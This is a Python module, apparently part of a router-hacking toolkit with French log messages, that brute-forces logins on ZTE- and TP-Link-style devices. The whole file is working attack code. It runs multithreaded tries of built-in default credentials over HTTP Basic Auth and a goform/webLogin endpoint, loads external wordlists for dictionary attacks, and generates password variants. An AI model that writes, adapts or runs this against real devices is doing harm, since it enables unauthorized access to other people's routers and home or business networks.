import requests
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.helpers import info, success, warning, error
from colorama import Fore, Style


class CredentialBruteforce:
    def __init__(self, target=None):
        self.target = target
        self.results = []
        self.found = False

    def set_target(self, target):
        self.target = target
        return self

    def brute_force(self, usernames=None, passwords=None, threads=10):
        if not self.target:
            error("Aucune cible définie")
            return []

        if usernames is None:
            usernames = ["admin", "root", "user", "zte", "support", "guest", "supervisor"]
        if passwords is None:
            passwords = [
                "admin", "password", "1234", "12345", "123456", "root",
                "zte", "ZTE", "tp-link", "TP-Link", "Admin", "PASSWORD",
                "default", "router", "user", "guest", "support",
                "admin123", "password123", "letmein", "welcome",
                " ", "", "admin1", "administrator", "Admin123",
                "12345678", "1111", "0000", "pass", " Admin",
            ]

        info(f"Brute-force sur {self.target['ip']}:{self.target['port']}")
        info(f"  {len(usernames)} utilisateurs x {len(passwords)} mots de passe = {len(usernames)*len(passwords)} combinaisons")

        self.results = []
        self.found = False

        combos = [(u, p) for u in usernames for p in passwords]

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(self._try_login, user, pwd): (user, pwd)
                for user, pwd in combos
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)
                if self.found:
                    executor.shutdown(wait=False)
                    break

        return self.results

    def _try_login(self, username, password):
        if self.found:
            return None

        scheme = self.target.get("scheme", "http")
        ip = self.target["ip"]
        port = self.target["port"]

        try:
            auth_str = f"{username}:{password}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()

            resp = requests.get(
                f"{scheme}://{ip}:{port}/",
                headers={"Authorization": f"Basic {auth_b64}"},
                timeout=3,
                verify=False
            )

            if resp.status_code == 200 and "login" not in resp.text.lower()[:300]:
                self.found = True
                success(f"  {Fore.GREEN}TROUVÉ! {username}:{password}{Style.RESET_ALL}")
                return {
                    "username": username,
                    "password": password,
                    "method": "HTTP Basic Auth",
                    "target": f"{ip}:{port}"
                }

            resp = requests.post(
                f"{scheme}://{ip}:{port}/goform/webLogin",
                data={"username": username, "password": password},
                timeout=3,
                verify=False
            )
            if resp.status_code == 200 and "error" not in resp.text.lower()[:200]:
                self.found = True
                success(f"  {Fore.GREEN}TROUVÉ! {username}:{password} (goform){Style.RESET_ALL}")
                return {
                    "username": username,
                    "password": password,
                    "method": "goform/webLogin",
                    "target": f"{ip}:{port}"
                }

        except Exception:
            pass

        return None

    def dictionary_attack(self, username="admin", wordlist_path=None, threads=20):
        if wordlist_path:
            try:
                with open(wordlist_path, "r", encoding="latin-1") as f:
                    passwords = [p.strip() for p in f if p.strip()]
                info(f"Chargé {len(passwords)} mots de passe depuis {wordlist_path}")
                return self.brute_force([username], passwords, threads)
            except FileNotFoundError:
                error(f"Wordlist introuvable: {wordlist_path}")
                return []
        else:
            return self.brute_force([username], threads=threads)

    def generate_wordlist(self, base_words=None):
        if base_words is None:
            base_words = ["admin", "root", "zte", "tp-link", "router", "password"]

        variants = set()
        for word in base_words:
            variants.add(word)
            variants.add(word.capitalize())
            variants.add(word.upper())
            variants.add(word + "123")
            variants.add(word + "1234")
            variants.add(word + "12345")
            variants.add(word + "123456")
            variants.add(word + "!")
            variants.add("!" + word)
            variants.add(word + "@")
            variants.add(word + "#")
            variants.add(word + "2024")
            variants.add(word + "2023")
            variants.add(word + "2025")
            variants.add(word + "2026")

        return list(variants)
